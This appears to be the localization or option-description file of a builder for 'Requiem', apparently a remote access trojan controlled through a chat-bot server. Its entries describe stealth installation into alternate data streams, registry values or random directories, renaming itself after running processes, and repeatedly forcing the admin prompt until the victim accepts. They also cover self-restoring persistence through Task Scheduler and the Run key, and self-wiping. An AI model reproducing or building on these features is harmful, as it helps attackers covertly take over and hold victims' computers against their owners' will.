bot.name: Server ID
bot.info: The ID of the server that will control the bot.

bot.name: Category ID
bot.info: The ID of the category each session will be controlled in.

bot.name: Tracking ID
bot.info: A custom ID/code to help you keep track of this build.

bot.name: Add buttons to replies
bot.info: Adds buttons to some of the bot's replies to make follow up actions easier.

setup.name: Use custom directory
setup.info: Installs Requiem to a custom directory. If unchecked, Requiem will install to %USERPROFILE%\Music or %PROGRAMFILES% if it has admin privileges.

setup.name: Randomize directory
setup.info: Picks a random directory from %USERPROFILE% or %PROGRAMFILES% if it has admin privileges. This has priority over "Use custom directory".

setup.name: Use custom name
setup.info: Rename Requiem to a custom name.

setup.name: Custom name
setup.info: The name Requiem will rename itself to.

setup.name: Randomize name
setup.info: Picks a random name from any running executable file. This has prority over "Use custom name".

setup.name: Use alternate data stream
setup.info: Installs Requiem to a file's ADS.

setup.name: Custom alternate data stream
setup.info: The Path of the ADS Requiem will install itself to. If this is empty, It will install to %SYSTEMROOT% if it has admin privileges or %USERPROFILE%\AppData if it does not.

setup.name: Put in registry
setup.info: Stores Requiem's file data in a registry value.

options.name: Require admin
options.info: Requires Requiem to have admin privileges to run.

options.name: Prompt admin
options.info: Triggers the User Account Control prompt to run Requiem as admin.

options.name: Force admin
options.info: Continuously triggers the User Account Control prompt until the user accepts.

options.name: Continue without admin
options.info: If the user declines the Account Control prompt while "Require admin" is enabled, Requiem will still run.

options.name: Connect bot max retries
options.info: The number of retries to connect the bot before Requiem exits or wipes itself.

options.name: Connect bot retry delay
options.info: How long to wait in seconds before retring to connect the bot again.

options.name: Exit if cannot connect
options.info: If the bot still could not connect after the retries, it will exit instead of wiping itself.

persistence.name: Persistence name
persistence.info: The name of all persistence values or items.

persistence.name: Randomize persistence file location
persistence.info: Clones Requiem's file for ever persistence method instead of pointing back to a single file. The originial file will be deleted after initialization.

persistence.name: Task schedular
persistence.info: Uses the Task Schedular, It will start Requiem continuosly after that every 8 minutes.

persistence.name: Registry
persistence.info: Uses the Run key in the Registry, It will also enable itself if it was disabled from e.g. Task Manager.

site.name: End to end encryption
site.info: Encrypts all saved data. Sends only encrypted data to the server.

site.name: Save config
site.info: Saved the data set in the site.

build.name: Pad encrypted data
build.info: Inserts dummy characters randomly in all encrypted data.
